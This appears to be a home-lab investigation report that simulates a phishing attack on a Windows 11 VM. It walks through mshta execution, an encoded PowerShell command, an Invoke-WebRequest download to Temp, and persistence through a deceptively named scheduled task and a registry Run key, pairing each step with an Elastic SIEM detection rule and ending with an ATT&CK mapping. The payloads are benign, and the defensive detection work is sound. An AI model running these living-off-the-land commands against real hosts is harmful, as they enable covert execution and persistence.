# Investigation Report

## Objective

The objective of this lab was to simulate a realistic phishing attack that progresses from initial execution to persistence using legitimate Windows binaries, while validating custom Elastic SIEM detection rules and understanding how a SOC analyst would investigate the incident.

---

# Lab Setup

- Windows 11 VM (VirtualBox)
- Sysmon with SwiftOnSecurity configuration
- Winlogbeat
- Elasticsearch
- Kibana (Elastic SIEM)

---

# Attack Chain

```text
Phishing Email
        ↓
MSHTA
        ↓
PowerShell
        ↓
Encoded Command
        ↓
Download Payload
        ↓
Scheduled Task
        ↓
Registry Run Key
```

---

# Step 1 — MSHTA Execution

## What the attacker is doing

The victim opens a phishing attachment. Hidden inside is a call to `mshta.exe` — a legitimate Windows binary capable of executing HTML applications and scripts. Attackers frequently abuse MSHTA because it is trusted by Windows and often bypasses traditional antivirus solutions. This technique is an example of Living-off-the-Land (LOLBins).

## Command Executed

```cmd
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"",0,true"))
```

> This command launches `calc.exe` for demonstration purposes. Real-world attacks typically launch PowerShell or another malicious payload.

## Investigation Findings

Sysmon Event ID 1 recorded `mshta.exe` executing as a child of `cmd.exe`.

Normally, interactive MSHTA execution originates from `explorer.exe`.

The abnormal parent-child relationship indicates scripted execution rather than normal user activity.

## Detection Rule

```text
event.code: "1"
AND process.name: "mshta.exe"
AND process.command_line: *vbscript*
```

**Result**

High Severity

Risk Score: 73

---

# Step 2 — PowerShell Execution & Encoded Command

## What the attacker is doing

MSHTA launches PowerShell using an encoded Base64 command to hide the original command from simple string-based detections.

## Commands Executed

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Start-Process calc.exe'))

powershell.exe -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=
```

## Investigation Findings

Sysmon Event ID 1 recorded PowerShell executing with the `-EncodedCommand` parameter.

PowerShell Script Block Logging (Event ID 4104) automatically decoded the Base64 content, exposing the original command.

The parent process was also PowerShell, creating an unusual PowerShell → PowerShell execution chain.

## Detection Rule

```text
event.code: "1"
AND process.command_line:(*-EncodedCommand* OR *-enc*)
```

**Result**

High Severity

Risk Score: 73

---

# Step 3 — PowerShell Download Activity

## What the attacker is doing

PowerShell downloads an external payload using `Invoke-WebRequest`.

## Command Executed

```powershell
powershell.exe -Command "Invoke-WebRequest -Uri 'https://example.com' -OutFile '$env:TEMP\test_payload.txt'"
```

## Investigation Findings

Searching

```
process.command_line:*Invoke-WebRequest*
```

returned 11 matching documents.

The logs showed:

- Outbound web request
- File written into the Temp directory
- Sysmon Event ID 3 (Network Connection)
- Sysmon Event ID 11 (File Creation)

## Detection Rule

```text
event.code:"1"
AND process.name:"powershell.exe"
AND process.command_line:(*Invoke-WebRequest* OR *WebClient* OR *DownloadFile*)
```

**Result**

High Severity

11 Alerts Generated

---

# Step 4 — Scheduled Task Persistence

## What the attacker is doing

To maintain persistence after reboot, the attacker creates a Scheduled Task named `SecurityUpdateTask`.

## Command Executed

```cmd
schtasks /create /tn "SecurityUpdateTask" /tr "notepad.exe" /sc daily /st 12:00
```

## Investigation Findings

Windows Security Event ID 4698 recorded the Scheduled Task creation.

The parent process was `cmd.exe`.

`taskhostw.exe` executed shortly afterward, confirming task execution.

## Detection Rule

```text
event.code:"4698"
AND process.parent.name:("powershell.exe" OR "cmd.exe" OR "mshta.exe")
```

**Result**

High Severity

Risk Score:73

---

# Step 5 — Registry Run Key Persistence

## What the attacker is doing

As a secondary persistence mechanism, the attacker creates a Registry Run Key.

## Command Executed

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "LabPersistenceTest" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

## Investigation Findings

Sysmon Event ID 13 captured the Registry Value modification.

Searching

```
process.name:"reg.exe"
OR registry.value.name:"LabPersistenceTest"
```

returned three matching events.

## Detection Rule

```text
event.code:"13"
AND registry.path:(*\\CurrentVersion\\Run*)
```

**Result**

High Severity

Risk Score:73

---

# Investigation Summary

The investigation successfully reconstructed the complete attack sequence:

MSHTA

↓

PowerShell

↓

Encoded Command

↓

PowerShell Download

↓

Scheduled Task Persistence

↓

Registry Run Key Persistence

Every stage generated telemetry in Sysmon and Elastic SIEM, allowing the entire attack chain to be reconstructed using custom detection rules.

---

# Incident Response Summary

## Alert Triage

Multiple high-severity alerts were generated on `win11-vm` within a short time window.

Rather than investigating each alert independently, the alerts were correlated into a single attack chain.

---

## Scope Assessment

Affected Host

- win11-vm

Affected User

- NITS

Lateral Movement

- None observed

Credential Theft

- None observed

Additional Hosts

- None

---

## Recommended Containment

- Isolate the affected endpoint.
- Terminate suspicious PowerShell processes.
- Preserve logs for forensic analysis.
- Notify the security team.

---

## Recommended Eradication

- Remove the Scheduled Task (`SecurityUpdateTask`).
- Delete the Registry Run Key (`LabPersistenceTest`).
- Remove downloaded payloads.
- Perform a full endpoint security scan.

---

## Recovery

- Reboot the endpoint.
- Verify persistence mechanisms have been removed.
- Continue monitoring Elastic SIEM for recurring activity.

---

# MITRE ATT&CK Mapping

| Attack Phase | Detection Rule | MITRE Technique |
|--------------|----------------|-----------------|
| Execution | MSHTA Execution | T1218.005 |
| Execution | PowerShell Execution | T1059.001 |
| Defense Evasion | Encoded PowerShell | T1027 |
| Command and Control | PowerShell Download Activity | T1105 |
| Persistence | Scheduled Task Creation | T1053.005 |
| Persistence | Registry Run Key Creation | T1547.001 |

---

# Lessons Learned

This project demonstrates how attackers abuse trusted Windows binaries rather than relying on obvious malware.

By correlating multiple alerts generated from Sysmon telemetry, it was possible to reconstruct the complete attack lifecycle and validate custom Elastic SIEM detection rules.

The exercise strengthened practical skills in attack simulation, detection engineering, alert investigation, and mapping attacker behavior to the MITRE ATT&CK framework.
